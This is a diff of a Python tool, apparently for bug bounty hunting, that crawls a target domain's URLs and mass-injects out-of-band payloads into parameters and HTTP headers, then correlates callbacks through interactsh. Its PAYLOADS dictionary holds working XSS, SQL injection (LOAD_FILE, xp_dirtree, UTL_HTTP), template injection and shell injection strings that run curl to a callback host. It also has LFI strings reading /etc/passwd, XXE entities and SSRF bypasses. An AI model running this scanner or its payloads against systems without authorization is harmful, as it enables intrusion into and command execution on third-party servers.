@@ -33,6 +33,7 @@ import threading
 import queue
 import hashlib
 import urllib.parse
+import urllib.request
 import secrets
 import re
 import shlex
@@ -41,7 +42,6 @@ from datetime import datetime, timezone
 from pathlib import Path
 from typing import Optional
 
-# ── Tenta importar requests; avisa se não tiver ──────────────────────────────
 try:
     import requests
     import urllib3
@@ -52,19 +52,18 @@ except ImportError:
 
 # ─── Cores no terminal ────────────────────────────────────────────────────────
 class C:
-    RED    = "\033[91m"
-    GREEN  = "\033[92m"
-    YELLOW = "\033[93m"
-    BLUE   = "\033[94m"
-    CYAN   = "\033[96m"
-    MAGENTA= "\033[95m"
-    BOLD   = "\033[1m"
-    DIM    = "\033[2m"
-    RESET  = "\033[0m"
+    RED     = "\033[91m"
+    GREEN   = "\033[92m"
+    YELLOW  = "\033[93m"
+    BLUE    = "\033[94m"
+    CYAN    = "\033[96m"
+    MAGENTA = "\033[95m"
+    BOLD    = "\033[1m"
+    DIM     = "\033[2m"
+    RESET   = "\033[0m"
 
     @staticmethod
     def strip(text: str) -> str:
-        """Remove códigos ANSI — para gravar em arquivo."""
         return re.sub(r'\033\[[0-9;]*m', '', text)
 
 def banner():
@@ -80,7 +79,6 @@ def banner():
 
 # ─── Logger duplo: cores no terminal, texto limpo em arquivo ─────────────────
 class CleanFileHandler(logging.FileHandler):
-    """Handler que remove ANSI antes de gravar no arquivo."""
     def emit(self, record):
         record.msg = C.strip(str(record.msg))
         super().emit(record)
@@ -107,7 +105,7 @@ def setup_logging(output_dir: Path) -> logging.Logger:
     logger.addHandler(ch)
     return logger
 
-logger: logging.Logger = logging.getLogger("oob")  # preenchido em main()
+logger: logging.Logger = logging.getLogger("oob")
 
 def log(msg: str, color: str = C.RESET, level: str = "info"):
     with _log_lock:
@@ -119,33 +117,50 @@ _uid_lock = threading.Lock()
 
 def unique_id(category: str, param: str) -> str:
     """
-    Gera UID globalmente único:
-      cat3 + timestamp_ms + 6 bytes aleatórios + param4
-    Formato: xss-17480523102345-a3f9c2-srch   (≤ 40 chars)
-    Colisão praticamente impossível mesmo com threads.
+    Gera UID globalmente único.
+    Formato: cat3-timestamp_ms-6bytes_rand-param4  (≤ 40 chars)
+
+    IMPORTANTE: para SSRF, o UID é usado como subdomínio (ex: uid.oob_host),
+    por isso usa apenas chars válidos em DNS: [a-z0-9-].
     """
     cat  = re.sub(r'[^a-z0-9]', '', category.lower())[:3]
     par  = re.sub(r'[^a-z0-9]', '', param.lower())[:4]
-    ts   = str(int(time.time() * 1000))        # milissegundos
-    rand = secrets.token_hex(3)                 # 6 chars hex
+    ts   = str(int(time.time() * 1000))
+    rand = secrets.token_hex(3)
 
     uid = f"{cat}-{ts}-{rand}-{par}"
 
     with _uid_lock:
-        # Garante unicidade mesmo em caso de corrida
         while uid in _uid_seen:
             uid = f"{cat}-{ts}-{secrets.token_hex(3)}-{par}"
         _uid_seen.add(uid)
 
     return uid
 
+# ─── Rate limiter global ─────────────────────────────────────────────────────
+# FIX: delay anterior era por thread — com N threads = N*delay req/s.
+# Agora é um semáforo global que garante no máximo 1 req a cada `delay` segundos,
+# independente do número de threads.
+class GlobalRateLimiter:
+    def __init__(self, delay: float):
+        self.delay = delay
+        self._lock = threading.Lock()
+        self._last = 0.0
+
+    def acquire(self):
+        with self._lock:
+            now = time.time()
+            gap = now - self._last
+            if gap < self.delay:
+                time.sleep(self.delay - gap)
+            self._last = time.time()
+
+_rate_limiter: GlobalRateLimiter = GlobalRateLimiter(0.3)  # default; sobrescrito em main()
+
 # ─── Execução segura de subprocessos ─────────────────────────────────────────
 def run_cmd(args: list[str], output_file: Optional[Path] = None,
             timeout: int = 300, stdin_data: str = "") -> str:
-    """
-    Executa comando como lista de argumentos (sem shell=True).
-    Evita injeção de comando via domínios com caracteres especiais.
-    """
+    """Executa comando como lista de argumentos (sem shell=True)."""
     log(f"  $ {' '.join(args)}", C.DIM, "debug")
     try:
         result = subprocess.run(
@@ -215,12 +230,10 @@ def phase_recon(domain: str, out: Path) -> Path:
     raw_dir = out / "raw"
     raw_dir.mkdir(exist_ok=True)
 
-    # ── gau ───────────────────────────────────────────────────────────────────
     log("→ gau...", C.CYAN)
     run_cmd(["gau", "--threads", "5", "--blacklist", "png,jpg,gif,svg,css,woff",
              domain], raw_dir / "gau.txt", timeout=300)
 
-    # ── gospider ──────────────────────────────────────────────────────────────
     log("→ gospider...", C.CYAN)
     gs_raw = raw_dir / "gospider_raw"
     gs_raw.mkdir(exist_ok=True)
@@ -233,18 +246,15 @@ def phase_recon(domain: str, out: Path) -> Path:
         gs_file
     )
 
-    # ── waybackurls ───────────────────────────────────────────────────────────
     log("→ waybackurls...", C.CYAN)
     run_cmd(["waybackurls", domain], raw_dir / "waybackurls.txt", timeout=300)
 
-    # ── Unifica + deduplica ───────────────────────────────────────────────────
     all_urls_file = out / "all_urls.txt"
     all_urls: set[str] = set()
     for f in raw_dir.glob("*.txt"):
         try:
             for line in f.read_text(encoding="utf-8", errors="ignore").splitlines():
                 line = line.strip()
-                # Descarta extensões estáticas e URLs vazias
                 if line and not re.search(
                     r'\.(png|jpg|jpeg|gif|svg|ico|css|woff|woff2|ttf|eot|mp4|mp3|pdf)(\?|$)',
                     line, re.I
@@ -256,7 +266,6 @@ def phase_recon(domain: str, out: Path) -> Path:
     all_urls_file.write_text("\n".join(sorted(all_urls)), encoding="utf-8")
     log(f"  URLs brutas (deduplicadas): {len(all_urls)}", C.GREEN)
 
-    # ── httpx: filtra endpoints vivos ────────────────────────────────────────
     log("→ httpx validando endpoints vivos...", C.CYAN)
     live_file = out / "live_urls.txt"
     run_cmd(
@@ -276,10 +285,13 @@ def phase_gf(live_urls_file: Path, out: Path) -> dict[str, Path]:
         log("gf não encontrado — pulando filtragem.", C.YELLOW, "warning")
         return {}
 
+    # FIX: verifica quais padrões estão realmente instalados antes de rodar.
+    # Padrões como 'idor' e 'xxe' não fazem parte do conjunto padrão do tomnomnom/gf.
+    available_patterns = set(run_shell("gf --list 2>/dev/null").splitlines())
+
     gf_dir = out / "gf"
     gf_dir.mkdir(exist_ok=True)
 
-    # Mapeia categoria → nome do padrão gf (alguns nomes diferem)
     categories = {
         "xss":      "xss",
         "sqli":     "sqli",
@@ -294,14 +306,32 @@ def phase_gf(live_urls_file: Path, out: Path) -> dict[str, Path]:
 
     files: dict[str, Path] = {}
     for cat, gf_pattern in categories.items():
+        # FIX: pula silenciosamente padrões não instalados em vez de gerar 0 resultados
+        # sem aviso, o que mascara a causa.
+        if available_patterns and gf_pattern not in available_patterns:
+            log(f"  [{cat.upper():8}] padrão gf '{gf_pattern}' não instalado — pulando", C.YELLOW, "warning")
+            continue
+
         out_file = gf_dir / f"gf_{cat}.txt"
-        # Pipe: cat file | gf pattern
-        result = run_shell(
-            f"cat {shlex.quote(str(live_urls_file))} | gf {shlex.quote(gf_pattern)} 2>/dev/null"
-        )
-        if result:
-            out_file.write_text(result, encoding="utf-8")
-            count = len(result.splitlines())
+        # FIX: usa subprocess com stdin em vez de shell=True para evitar
+        # qualquer risco de injeção via path do arquivo.
+        try:
+            with open(live_urls_file) as fin:
+                result = subprocess.run(
+                    ["gf", gf_pattern],
+                    stdin=fin,
+                    capture_output=True,
+                    text=True,
+                    timeout=120,
+                )
+            output = result.stdout.strip()
+        except Exception as e:
+            log(f"  [{cat.upper():8}] erro ao executar gf: {e}", C.RED, "error")
+            continue
+
+        if output:
+            out_file.write_text(output, encoding="utf-8")
+            count = len(output.splitlines())
             log(f"  [{cat.upper():8}] {count:4d} endpoints", C.GREEN)
             files[cat] = out_file
         else:
@@ -310,119 +340,129 @@ def phase_gf(live_urls_file: Path, out: Path) -> dict[str, Path]:
     return files
 
 # ─── Fase 2: Payloads ────────────────────────────────────────────────────────
+#
+# Convenções de substituição:
+#   {OOB}  → hostname do interactsh (ex: abc.oast.fun)
+#   {ID}   → UID único gerado por unique_id()
+#
+# Para SSRF e DNS OOB, o UID é colocado como SUBDOMÍNIO ({ID}.{OOB}) e não
+# como path, porque o interactsh registra o host no campo 'full-id' — que é
+# indexado para correlação. O path não aparece no full-id de hits DNS.
+#
 PAYLOADS: dict[str, list[str]] = {
     "xss": [
         '"><img src="https://{OOB}/{ID}" onerror=alert(1)>',
         "'><script src=https://{OOB}/{ID}></script>",
         '"><svg/onload=fetch(`https://{OOB}/{ID}`)>',
         '"><details open ontoggle=fetch(`https://{OOB}/{ID}`)>',
-        # DOM-based — útil quando param vai para innerHTML
         "javascript:fetch('https://{OOB}/{ID}')//?",
     ],
     "sqli": [
-        # MySQL out-of-band via LOAD_FILE (UNC path)
-        "' AND 1=1 AND LOAD_FILE(CONCAT(0x5c5c5c5c,'{OOB}',0x5c5c,'{ID}'))-- -",
-        # MSSQL via xp_dirtree
-        "'; EXEC master..xp_dirtree '\\\\{OOB}\\{ID}';-- -",
-        # PostgreSQL via COPY
-        "'; COPY (SELECT '') TO PROGRAM 'nslookup {OOB}';-- -",
-        # Oracle via UTL_HTTP
-        "' AND 1=(SELECT UTL_HTTP.REQUEST('https://{OOB}/{ID}') FROM dual)-- -",
-        # Blind time + OOB combo (MySQL)
-        "' AND SLEEP(0) AND 1=(SELECT 1 FROM (SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,'{OOB}',0x5c5c,'{ID}')))x)-- -",
+        # MySQL — OOB via LOAD_FILE com UNC path + subdomínio como UID
+        # (subdomínio garante correlação DNS no interactsh)
+        "' AND 1=1 AND LOAD_FILE(CONCAT('\\\\\\\\','{ID}','.{OOB}','\\\\a'))-- -",
+        # MSSQL — xp_dirtree via UNC com subdomínio
+        "'; EXEC master..xp_dirtree '\\\\{ID}.{OOB}\\share';-- -",
+        # PostgreSQL — OOB via dblink (requer extensão instalada)
+        "'; SELECT dblink_connect('host={ID}.{OOB} dbname=a user=a');-- -",
+        # Oracle — UTL_HTTP com subdomínio
+        "' AND 1=(SELECT UTL_HTTP.REQUEST('https://{ID}.{OOB}/') FROM dual)-- -",
+        # MySQL — Blind time + OOB combo (LOAD_FILE com subdomínio)
+        "' AND SLEEP(0) AND 1=(SELECT 1 FROM (SELECT LOAD_FILE(CONCAT('\\\\\\\\','{ID}','.{OOB}','\\\\a')))x)-- -",
     ],
     "ssrf": [
-        "https://{OOB}/{ID}",
-        "http://{OOB}/{ID}",
-        # Bypass comuns
-        "http://[::ffff:{OOB}]/{ID}",
-        "http://{OOB}%2F{ID}",
-        "dict://{OOB}:80/{ID}",
-        "ftp://{OOB}/{ID}",
-        "//\t{OOB}/{ID}",
+        # FIX: UID como subdomínio para correlação DNS confiável no interactsh.
+        # O hit DNS traz full-id = "{ID}.{OOB}" → find_fuzzy() localiza o payload.
+        "https://{ID}.{OOB}/",
+        "http://{ID}.{OOB}/",
+        # Bypasses de validação com subdomínio
+        "http://{ID}.{OOB}%2F",
+        "dict://{ID}.{OOB}:80/",
+        "ftp://{ID}.{OOB}/",
+        # Bypass por fragmento e querystring (validadores ingênuos)
+        "https://legit.com#{ID}.{OOB}",
+        "https://legit.com@{ID}.{OOB}/",
+        # Bypass por path traversal
+        "//\t{ID}.{OOB}/",
     ],
     "ssti": [
         # Jinja2 / Python
-        "{{''.__class__.__mro__[1].__subclasses__()[407](['curl','https://{OOB}/{ID}'],stdout=-1).communicate()}}",
+        "{{''.__class__.__mro__[1].__subclasses__()[407](['curl','https://{ID}.{OOB}/'],stdout=-1).communicate()}}",
         # Freemarker (Java)
-        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl https://{OOB}/{ID}")}',
+        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl https://{ID}.{OOB}/")}',
         # Pebble (Java)
-        "{% set cmd = 'curl https://{OOB}/{ID}' %}{{ cmd }}",
+        "{% set cmd = 'curl https://{ID}.{OOB}/' %}{{ cmd }}",
         # Twig (PHP)
-        "{{['curl https://{OOB}/{ID}']|filter('system')}}",
+        "{{['curl https://{ID}.{OOB}/']|filter('system')}}",
         # ERB (Ruby)
-        "<%= `curl https://{OOB}/{ID}` %>",
+        "<%= `curl https://{ID}.{OOB}/` %>",
         # Velocity (Java)
-        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('curl https://{OOB}/{ID}'))",
+        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('curl https://{ID}.{OOB}/'))$ex",
     ],
     "redirect": [
-        "https://{OOB}/{ID}",
-        "//https://{OOB}/{ID}",
-        "//{OOB}/{ID}",
-        # Bypasses de validação
-        "https://{OOB}%2F{ID}",
-        "https:/%5C%5C{OOB}/{ID}",
-        "https://{OOB};@legit.com/{ID}",
-        "@{OOB}/{ID}",
+        "https://{ID}.{OOB}/",
+        "//https://{ID}.{OOB}/",
+        "//{ID}.{OOB}/",
+        "https://{ID}.{OOB}%2F",
+        "https:/%5C%5C{ID}.{OOB}/",
+        "https://{ID}.{OOB};@legit.com/",
+        "@{ID}.{OOB}/",
     ],
     "rce": [
-        # Shell injection em diferentes contextos
-        "; curl https://{OOB}/{ID} #",
-        "| curl https://{OOB}/{ID}",
-        "`curl https://{OOB}/{ID}`",
-        "$(curl https://{OOB}/{ID})",
-        # Encoded
-        "%3B+curl+https%3A%2F%2F{OOB}%2F{ID}",
-        # Newline injection
-        "\ncurl https://{OOB}/{ID}\n",
-        # PowerShell (targets Windows)
-        "; Invoke-WebRequest https://{OOB}/{ID} #",
+        "; curl https://{ID}.{OOB}/ #",
+        "| curl https://{ID}.{OOB}/",
+        "`curl https://{ID}.{OOB}/`",
+        "$(curl https://{ID}.{OOB}/)",
+        "%3B+curl+https%3A%2F%2F{ID}.{OOB}%2F",
+        "\ncurl https://{ID}.{OOB}/\n",
+        # PowerShell (Windows)
+        "; Invoke-WebRequest https://{ID}.{OOB}/ #",
     ],
     "lfi": [
-        # Wrapper PHP + OOB
-        "php://filter/convert.base64-encode/resource=https://{OOB}/{ID}",
-        # Bypass null byte
-        "../../etc/passwd%00https://{OOB}/{ID}",
-        # Wrapper expect
-        "expect://curl https://{OOB}/{ID}",
-        # input://
-        "php://input",  # payload vai no body
+        # Wrapper PHP com OOB
+        "php://filter/convert.base64-encode/resource=https://{ID}.{OOB}/",
+        # expect:// executa comando
+        "expect://curl https://{ID}.{OOB}/",
+        # Bypass null byte (PHP < 5.3)
+        "../../etc/passwd%00https://{ID}.{OOB}/",
+        # FIX: removido "php://input" — sem implementação de POST com body,
+        # era enviado como GET e nunca gerava hit OOB.
     ],
     "xxe": [
-        # Standard HTTP OOB
-        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "https://{OOB}/{ID}">]><r>&x;</r>',
+        # Standard HTTP OOB com subdomínio
+        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "https://{ID}.{OOB}/">]><r>&x;</r>',
         # Parâmetro entity (blind XXE)
-        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % oob SYSTEM "https://{OOB}/{ID}">%oob;]>',
+        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % oob SYSTEM "https://{ID}.{OOB}/">%oob;]>',
         # SVG XXE
-        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xl="http://www.w3.org/1999/xlink"><image xl:href="https://{OOB}/{ID}"/></svg>',
+        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xl="http://www.w3.org/1999/xlink"><image xl:href="https://{ID}.{OOB}/"/></svg>',
     ],
-    "ssrf_header": [],  # preenchido dinamicamente
-    "idor": [
-        # IDOR com SSRF embutido
-        "https://{OOB}/{ID}",
-    ],
+    # FIX: removidos "ssrf_header" (lista vazia — nunca gerava tasks) e "idor"
+    # (payloads idênticos ao ssrf). Headers OOB são injetados automaticamente
+    # para ssrf/rce/lfi/xxe via OOB_HEADERS abaixo. IDOR pode ser testado
+    # adicionando o padrão gf 'idor' e reutilizando payloads ssrf.
 }
 
-# Cabeçalhos HTTP para injeção de OOB (SSRF via header)
+# Cabeçalhos HTTP para injeção OOB (SSRF via header).
+# FIX: usa subdomínio {ID}.{OOB} nos valores — correlação DNS garantida.
 OOB_HEADERS: list[tuple[str, str]] = [
-    ("X-Forwarded-For",          "https://{OOB}/{ID}"),
-    ("X-Real-IP",                "{OOB}"),
-    ("Referer",                  "https://{OOB}/{ID}"),
-    ("X-Forwarded-Host",         "{OOB}"),
-    ("X-Original-URL",           "https://{OOB}/{ID}"),
-    ("X-Custom-IP-Authorization","{OOB}"),
-    ("X-Originating-IP",         "{OOB}"),
-    ("True-Client-IP",           "{OOB}"),
-    ("CF-Connecting-IP",         "{OOB}"),
-    ("X-Host",                   "{OOB}"),
-    ("Forwarded",                "for={OOB};by={OOB}"),
+    ("X-Forwarded-For",           "{ID}.{OOB}"),
+    ("X-Real-IP",                 "{ID}.{OOB}"),
+    ("Referer",                   "https://{ID}.{OOB}/"),
+    ("X-Forwarded-Host",          "{ID}.{OOB}"),
+    ("X-Original-URL",            "https://{ID}.{OOB}/"),
+    ("X-Custom-IP-Authorization", "{ID}.{OOB}"),
+    ("X-Originating-IP",          "{ID}.{OOB}"),
+    ("True-Client-IP",            "{ID}.{OOB}"),
+    ("CF-Connecting-IP",          "{ID}.{OOB}"),
+    ("X-Host",                    "{ID}.{OOB}"),
+    ("Forwarded",                 "for={ID}.{OOB};by={ID}.{OOB}"),
 ]
 
 # ─── PayloadLog — O(1) lookup por uid ────────────────────────────────────────
 class PayloadLog:
     def __init__(self, log_file: Path):
         self.log_file = log_file
-        self._by_uid: dict[str, dict] = {}   # lookup O(1)
+        self._by_uid: dict[str, dict] = {}
         self._all:    list[dict]      = []
         self._lock    = threading.Lock()
 
@@ -436,7 +476,7 @@ class PayloadLog:
         entry = {
             "uid":       uid,
             "timestamp": datetime.now(timezone.utc).isoformat(),
-            "unix_ts":   int(time.time() * 1000),   # milissegundos
+            "unix_ts":   int(time.time() * 1000),
             "category":  category,
             "url":       url,
             "param":     param,
@@ -450,15 +490,30 @@ class PayloadLog:
         return entry
 
     def find_by_uid(self, uid: str) -> Optional[dict]:
-        """O(1) — dicionário indexado por uid."""
         with self._lock:
             return self._by_uid.get(uid)
 
     def find_fuzzy(self, raw_id: str) -> Optional[dict]:
-        """Busca por substring no raw_id do interactsh."""
+        """
+        Busca por substring no raw_id do interactsh.
+
+        Com UIDs como subdomínio ({ID}.{OOB}), o interactsh retorna
+        full-id = "{ID}.{OOB}" e o UID está no início — find_fuzzy bate certeiro.
+
+        FIX: também varre raw_request para categorias onde o UID pode ter
+        chegado via HTTP path em vez de subdomínio DNS.
+        """
         with self._lock:
             for uid, entry in self._by_uid.items():
                 if uid in raw_id:
+                    return entry
+        return None
+
+    def find_fuzzy_in_request(self, raw_request: str) -> Optional[dict]:
+        """Fallback: varre o corpo do raw_request procurando qualquer UID."""
+        with self._lock:
+            for uid, entry in self._by_uid.items():
+                if uid in raw_request:
                     return entry
         return None
 
@@ -480,7 +535,6 @@ def send_payload(session, url: str, headers: dict,
                  timeout: int = 8) -> str:
     """Envia GET com payload e retorna HTTP status code."""
     if not HAS_REQUESTS:
-        # Fallback: curl como subprocesso seguro
         h_args = []
         for k, v in headers.items():
             h_args += ["-H", f"{k}: {v}"]
@@ -502,9 +556,8 @@ def send_payload(session, url: str, headers: dict,
     except Exception:
         return "???"
 
-# ─── Extração de parâmetros ───────────────────────────────────────────────────
+# ─── Extração e injeção de parâmetros ────────────────────────────────────────
 def extract_params(url: str) -> list[str]:
-    """Retorna lista de nomes de parâmetros da query string."""
     try:
         parsed = urllib.parse.urlparse(url)
         return list(urllib.parse.parse_qs(parsed.query, keep_blank_values=True).keys())
@@ -512,7 +565,17 @@ def extract_params(url: str) -> list[str]:
         return []
 
 def inject_param(url: str, param: str, value: str) -> str:
-    """Substitui o valor de um parâmetro específico na URL."""
+    """
+    Substitui o valor de um parâmetro específico na URL.
+
+    FIX: trata o caso especial "__path__" — quando não há query string,
+    adiciona o payload como novo parâmetro em vez de retornar a URL intacta,
+    o que antes causava o envio do payload para o destino errado.
+    """
+    if param == "__path__":
+        sep = "&" if "?" in url else "?"
+        return f"{url}{sep}oob={urllib.parse.quote(value, safe='')}"
+
     try:
         parsed = urllib.parse.urlparse(url)
         qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
@@ -522,20 +585,15 @@ def inject_param(url: str, param: str, value: str) -> str:
     except Exception:
         return url
 
-# ─── Fase 2: Injeção (multi-thread + monitor em paralelo) ────────────────────
+# ─── Fase 2: Injeção (multi-thread + rate limiter global) ────────────────────
 def _inject_one(task: dict, session, plog: PayloadLog, oob_host: str,
                 proxy: str) -> dict:
-    """
-    Executa um único task de injeção. Retornado para o executor.
-    task = { url, param, category, payload_template }
-    """
-    uid     = unique_id(task["category"], task["param"])
+    uid = unique_id(task["category"], task["param"])
     payload = (task["payload_template"]
                .replace("{OOB}", oob_host)
                .replace("{ID}", uid))
 
     if task["param"] == "__header__":
-        # Injeção via cabeçalho HTTP
         injected_url = task["url"]
         hdr_name     = task["header_name"]
         headers = {
@@ -546,16 +604,19 @@ def _inject_one(task: dict, session, plog: PayloadLog, oob_host: str,
         injected_url = inject_param(task["url"], task["param"], payload)
         headers = {
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
-            "X-Forwarded-For": f"{oob_host}",
         }
 
-    sent_at = datetime.now(timezone.utc).strftime("%H:%M:%S")   # HH:MM:SS UTC
+    sent_at = datetime.now(timezone.utc).strftime("%H:%M:%S")
     plog.record(uid, task["url"], task["param"], task["category"], payload)
+
+    # FIX: rate limiter global — garante delay real entre requisições,
+    # independente do número de threads em paralelo.
+    _rate_limiter.acquire()
     code = send_payload(session, injected_url, headers)
 
     return {
         "uid":      uid,
-        "sent_at":  sent_at,   # horário exato do envio — para cruzar com interactsh
+        "sent_at":  sent_at,
         "category": task["category"],
         "param":    task["param"],
         "url":      task["url"][:70],
@@ -570,21 +631,12 @@ def phase_inject(category_files: dict[str, Path], oob_host: str, out: Path,
     if not HAS_REQUESTS:
         log("requests não instalado — usando curl como fallback (mais lento).", C.YELLOW, "warning")
 
-    # Monta fila de tasks
     tasks: list[dict] = []
-
-    # Deduplicação global por (category, host+path, param)
-    # Garante que o mesmo endpoint não seja testado N vezes só porque
-    # o gau/gospider/waybackurls coletaram a mesma URL com valores
-    # de parâmetro diferentes.
-    # Ex: /embed?url=site1.com  /embed?url=site2.com  → mesmo endpoint base
     _seen_tasks: set[tuple] = set()
 
     def _url_base(url: str) -> str:
-        """Normaliza URL para deduplicação: mantém scheme+host+path, descarta valores de QS."""
         try:
             p = urllib.parse.urlparse(url)
-            # Mantém os *nomes* dos parâmetros mas zera os valores
             params = sorted(urllib.parse.parse_qs(p.query, keep_blank_values=True).keys())
             normalized_qs = "&".join(f"{k}=" for k in params)
             return urllib.parse.urlunparse(p._replace(query=normalized_qs, fragment=""))
@@ -596,13 +648,9 @@ def phase_inject(category_files: dict[str, Path], oob_host: str, out: Path,
             continue
 
         raw_urls = [u.strip() for u in gf_file.read_text().splitlines() if u.strip()]
-
-        # Primeiro dedup exato (remove cópias 100% idênticas)
         raw_urls = list(dict.fromkeys(raw_urls))
 
-        # Segundo dedup por base de URL + categoria
-        # Mantém a primeira URL encontrada para cada base única
-        seen_bases: dict[str, str] = {}   # base → url representativa
+        seen_bases: dict[str, str] = {}
         for url in raw_urls:
             base = _url_base(url)
             key  = (category, base)
@@ -622,7 +670,6 @@ def phase_inject(category_files: dict[str, Path], oob_host: str, out: Path,
 
             for param in params:
                 for tpl in PAYLOADS[category]:
-                    # Dedup global: (category, url_base, param, template_index)
                     tpl_key = (category, _url_base(url), param,
                                PAYLOADS[category].index(tpl))
                     if tpl_key in _seen_tasks:
@@ -633,7 +680,6 @@ def phase_inject(category_files: dict[str, Path], oob_host: str, out: Path,
                         "category": category, "payload_template": tpl,
                     })
 
-            # Injeção via headers — dedup por (category_hdr, url_base, header)
             if category in ("ssrf", "rce", "lfi", "xxe"):
                 for hdr_name, hdr_tpl in OOB_HEADERS:
                     hdr_key = (f"{category}_hdr", _url_base(url), hdr_name)
@@ -650,6 +696,7 @@ def phase_inject(category_files: dict[str, Path], oob_host: str, out: Path,
     total = len(tasks)
     log(f"  Tasks geradas: {total} "
         f"({len(category_files)} categorias, {threads} threads)", C.CYAN)
+    log(f"  Rate limit   : 1 req / {_rate_limiter.delay}s (global, não por thread)", C.DIM)
 
     if total == 0:
         log("  Nenhuma task — verifique se os arquivos gf têm conteúdo.", C.YELLOW, "warning")
@@ -659,7 +706,6 @@ def phase_inject(category_files: dict[str, Path], oob_host: str, out: Path,
     sent = 0
     errors = 0
 
-    # Cria sessions por thread via threading.local
     _local = threading.local()
 
     def get_session():
@@ -668,20 +714,24 @@ def phase_inject(category_files: dict[str, Path], oob_host: str, out: Path,
         return _local.session
 
     def worker(task):
-        time.sleep(delay)  # respeita delay por thread
         return _inject_one(task, get_session(), plog, oob_host, proxy)
 
     with ThreadPoolExecutor(max_workers=threads) as ex:
         futures = {ex.submit(worker, t): t for t in tasks}
         for fut in as_completed(futures):
             try:
-                res = fut.result()
+                # FIX: timeout por future — evita thread presa em endpoint que
+                # aceita conexão mas nunca responde (além do timeout do requests).
+                res = fut.result(timeout=30)
                 sent += 1
                 color = C.GREEN if res["code"] in ("200","201","301","302") else C.DIM
                 log(f"  {res['sent_at']} [{res['uid'][:30]}] {res['param']:12} "
                     f"HTTP {res['code']} → {res['url']}", color)
                 with open(results_file, "a", encoding="utf-8") as f:
                     f.write(json.dumps(res) + "\n")
+            except TimeoutError:
+                errors += 1
+                log(f"  Task excedeu timeout máximo (30s)", C.YELLOW, "warning")
             except Exception as e:
                 errors += 1
                 log(f"  Erro em task: {e}", C.RED, "warning")
@@ -689,13 +739,9 @@ def phase_inject(category_files: dict[str, Path], oob_host: str, out: Path,
     log(f"\n  Enviados: {sent} | Erros: {errors}", C.GREEN + C.BOLD)
     return sent
 
-# ─── Fase 3: Monitoramento interactsh (thread separada) ──────────────────────
+# ─── Fase 3: Monitoramento interactsh ────────────────────────────────────────
 def phase_monitor(oob_host: str, plog: PayloadLog, out: Path,
                   duration: int = 300, parallel: bool = False):
-    """
-    Inicia o monitor.
-    parallel=True → roda em thread separada (para injeção e monitor em simultâneo).
-    """
     if parallel:
         t = threading.Thread(
             target=_monitor_loop,
@@ -725,15 +771,7 @@ def _monitor_loop(oob_host: str, plog: PayloadLog,
 
     log("  Iniciando interactsh-client...", C.CYAN)
 
-    # ── Notas sobre o interactsh-client v1.3+: ────────────────────────────
-    # • Linhas [INF]/[WRN]/[ERR] vão para STDOUT (não só stderr)
-    # • O JSON de cada hit também vai para STDOUT
-    # • O campo "timestamp" já está no JSON do hit (RFC3339 com nanosegundos)
-    # • Usar -server apenas quando o host não termina em oast.* (servidor público)
-    # ──────────────────────────────────────────────────────────────────────
     cmd = ["interactsh-client", "-json", "-poll-interval", "5"]
-    # Se o usuário informou um host customizado (não é o padrão interactsh)
-    # usa -server. Para oast.fun / oast.me o cliente conecta por conta própria.
     if not re.search(r"oast\.(fun|me|live|online)", oob_host):
         cmd += ["-server", oob_host]
 
@@ -742,19 +780,17 @@ def _monitor_loop(oob_host: str, plog: PayloadLog,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
         text=True,
-        bufsize=1,          # line-buffered
+        bufsize=1,
     )
 
-    # Thread que drena stderr — alguns builds ainda usam stderr para [INF]
     def drain_stderr():
         for raw in proc.stderr:
             raw = raw.strip()
             if not raw:
                 continue
-            # Mostra [INF] normalmente, destaca erros
-            lvl  = "debug"
+            lvl   = "debug"
             color = C.DIM
-            low  = raw.lower()
+            low   = raw.lower()
             if any(k in low for k in ("error", "failed", "invalid", "refused")):
                 lvl   = "warning"
                 color = C.YELLOW
@@ -762,7 +798,6 @@ def _monitor_loop(oob_host: str, plog: PayloadLog,
 
     threading.Thread(target=drain_stderr, daemon=True, name="iactsh-stderr").start()
 
-    # Contagem regressiva visível no terminal
     def _countdown():
         remaining = duration
         while remaining > 0 and proc.poll() is None:
@@ -770,6 +805,7 @@ def _monitor_loop(oob_host: str, plog: PayloadLog,
             remaining -= 10
             if remaining > 0:
                 log(f"  ⏱  {remaining}s restantes no monitor...", C.DIM)
+
     threading.Thread(target=_countdown, daemon=True, name="iactsh-timer").start()
 
     start  = time.time()
@@ -779,7 +815,6 @@ def _monitor_loop(oob_host: str, plog: PayloadLog,
         while time.time() - start < duration:
             line = proc.stdout.readline()
 
-            # Processo encerrou e não há mais output
             if not line:
                 if proc.poll() is not None:
                     log("  interactsh-client encerrou inesperadamente.", C.RED, "error")
@@ -791,10 +826,7 @@ def _monitor_loop(oob_host: str, plog: PayloadLog,
             if not line:
                 continue
 
-            # ── v1.3+ mistura [INF]/[WRN]/[DBG] com JSON no stdout ────────
-            # Filtra linhas que claramente não são JSON
             if line.startswith("["):
-                # Pode ser [INF], [WRN], [ERR], [DBG] — exibe e continua
                 low = line.lower()
                 if any(k in low for k in ("error", "failed", "invalid")):
                     log(f"  ⚠ {line}", C.YELLOW, "warning")
@@ -802,15 +834,12 @@ def _monitor_loop(oob_host: str, plog: PayloadLog,
                     log(f"  {line}", C.DIM, "debug")
                 continue
 
-            # Tenta parsear como JSON do hit
             try:
                 data = json.loads(line)
             except json.JSONDecodeError:
-                # Linha inesperada — loga em debug e segue
                 log(f"  [stdout não-JSON] {line[:120]}", C.DIM, "debug")
                 continue
 
-            # Só processa se tiver os campos esperados de um hit
             if "protocol" not in data and "unique-id" not in data:
                 continue
 
@@ -829,48 +858,42 @@ def _monitor_loop(oob_host: str, plog: PayloadLog,
 
